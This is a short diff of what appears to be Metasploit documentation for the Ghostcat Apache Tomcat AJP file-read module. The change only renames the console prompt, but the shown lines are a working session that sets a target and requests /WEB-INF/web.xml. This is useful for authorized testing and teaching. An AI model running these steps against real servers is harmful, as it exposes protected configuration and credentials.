@@ -37,14 +37,14 @@ The port on the target that is running the Apache JServ Protocol (AJP).
 ### Apache Tomcat 8.5.32
 
 ```
-msf6 > use auxiliary/admin/http/tomcat_ghostcat
-msf6 auxiliary(admin/http/tomcat_ghostcat) > set RHOSTS 127.0.0.1
+msf > use auxiliary/admin/http/tomcat_ghostcat
+msf auxiliary(admin/http/tomcat_ghostcat) > set RHOSTS 127.0.0.1
 RHOSTS => 127.0.0.1
-msf6 auxiliary(admin/http/tomcat_ghostcat) > set RPORT 8080
+msf auxiliary(admin/http/tomcat_ghostcat) > set RPORT 8080
 RPORT => 8080
-msf6 auxiliary(admin/http/tomcat_ghostcat) > set FILENAME /WEB-INF/web.xml
+msf auxiliary(admin/http/tomcat_ghostcat) > set FILENAME /WEB-INF/web.xml
 FILENAME => /WEB-INF/web.xml
-msf6 auxiliary(admin/http/tomcat_ghostcat) > run
+msf auxiliary(admin/http/tomcat_ghostcat) > run
 [*] Running module against 127.0.0.1
 Status Code: 200
 Accept-Ranges: bytes
